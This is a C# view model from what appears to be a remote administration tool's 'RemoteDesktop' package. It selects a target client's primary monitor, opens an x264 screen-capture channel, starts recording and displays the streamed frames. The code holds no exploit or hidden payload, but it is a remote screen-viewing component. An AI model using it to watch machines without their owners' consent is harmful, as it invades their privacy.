using System;
using System.ComponentModel;
using System.Linq;
using System.Windows.Media.Imaging;
using Orcus.Administration.Library.Clients;
using Orcus.Administration.Library.Extensions;
using Orcus.Administration.Library.ViewModels;
using Prism.Regions;
using RemoteDesktop.Administration.Channels;
using RemoteDesktop.Administration.Rest;
using RemoteDesktop.Shared.Options;

namespace RemoteDesktop.Administration.ViewModels
{
    public class RemoteDesktopViewModel : ViewModelBase
    {
        private readonly IPackageRestClient _restClient;
        private WriteableBitmap _image;

        public RemoteDesktopViewModel(ITargetedRestClient restClient)
        {
            _restClient = restClient.CreatePackageSpecific("RemoteDesktop");
        }

        public WriteableBitmap Image
        {
            get => _image;
            set => SetProperty(ref _image, value);
        }

        public override async void OnNavigatedTo(NavigationContext navigationContext)
        {
            base.OnNavigatedTo(navigationContext);
            var parameters = await RemoteDesktopResource.GetParameters(_restClient);
            var monitor = parameters.Screens.FirstOrDefault(x => x.IsPrimary) ?? parameters.Screens.First();

            var remoteDesktop = await RemoteDesktopResource.CreateScreenChannel(
                new DesktopDuplicationOptions {Monitor = {Value = Array.IndexOf(parameters.Screens, monitor)}}, new x264Options(), _restClient);
            remoteDesktop.PropertyChanged += RemoteDesktopOnPropertyChanged;
            await remoteDesktop.StartRecording(_restClient);
        }

        private void RemoteDesktopOnPropertyChanged(object sender, PropertyChangedEventArgs e)
        {
            var remoteDesktop = (RemoteDesktopChannel) sender;
            switch (e.PropertyName)
            {
                case nameof(RemoteDesktopChannel.Image):
                    Image = remoteDesktop.Image;
                    break;
            }
        }
    }
}